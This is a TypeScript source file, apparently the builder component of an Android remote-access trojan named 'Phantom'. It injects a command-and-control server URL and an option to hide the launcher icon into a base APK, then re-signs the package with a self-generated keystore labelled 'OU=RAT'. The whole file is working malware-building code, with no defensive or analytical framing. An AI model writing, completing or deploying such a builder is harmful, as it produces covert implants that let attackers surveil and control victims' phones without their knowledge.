import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { config } from './config.js';

const exec = promisify(execFile);

async function ensureSigner() {
  if (fs.existsSync(config.signerJarPath)) return;
  fs.mkdirSync(path.dirname(config.signerJarPath), { recursive: true });
  const res = await fetch(config.signerJarUrl);
  if (!res.ok) throw new Error(`Signer download failed: HTTP ${res.status}`);
  fs.writeFileSync(config.signerJarPath, Buffer.from(await res.arrayBuffer()));
}

async function ensureKeystore() {
  if (fs.existsSync(config.keystorePath)) return;
  fs.mkdirSync(path.dirname(config.keystorePath), { recursive: true });
  const pw = crypto.randomBytes(12).toString('hex');
  await exec('keytool', [
    '-genkeypair', '-v', '-keystore', config.keystorePath,
    '-storepass', pw, '-keypass', pw, '-alias', 'phantom',
    '-keyalg', 'RSA', '-keysize', '2048', '-validity', '3650',
    '-dname', 'CN=Phantom, OU=RAT, O=Phantom, L=City, ST=State, C=US',
  ]);
  fs.writeFileSync(path.join(path.dirname(config.keystorePath), 'keystore.pass'), pw, { mode: 0o600 });
}

export interface BuildOptions { serverUrl: string; appName?: string; iconHidden?: boolean }

export async function buildApk(opts: BuildOptions): Promise<string> {
  if (!fs.existsSync(config.baseApkPath)) throw new Error('base.apk missing — run CI or place factory/baseApp/base.apk');
  await ensureSigner();
  await ensureKeystore();

  const work = path.join(config.buildsDir, crypto.randomBytes(6).toString('hex'));
  const outDir = path.join(config.buildsDir, 'out');
  fs.mkdirSync(work, { recursive: true });
  fs.mkdirSync(outDir, { recursive: true });

  const apk = path.join(work, 'unsigned.apk');
  fs.copyFileSync(config.baseApkPath, apk);

  // Inject C2 config into assets/config.json (zip -u replaces the entry; AssetManager reads it at runtime)
  const cfg = { server: opts.serverUrl.replace(/\/+$/, ''), app_name: opts.appName || 'Phantom', icon_hidden: !!opts.iconHidden };
  const assetsDir = path.join(work, 'assets');
  fs.mkdirSync(assetsDir, { recursive: true });
  fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(cfg));
  await exec('zip', ['-u', apk, 'assets/config.json'], { cwd: work });

  // Sign + zipalign (uber-apk-signer bundles apksigner 33.0.2 + zipalign binaries)
  const pw = fs.readFileSync(path.join(path.dirname(config.keystorePath), 'keystore.pass'), 'utf8').trim();
  await exec('java', [
    '-jar', config.signerJarPath, '--apks', apk, '--out', outDir,
    '--ks', config.keystorePath, '--ksAlias', 'phantom',
    '--ksPass', pw, '--ksKeyPass', pw, '--allowResign',
  ]);

  const candidates = fs.readdirSync(outDir).filter(f => f.endsWith('.apk') && !f.startsWith('unsigned.'));
  if (!candidates.length) throw new Error('Signing produced no APK');
  return path.join(outDir, candidates[0]);
}
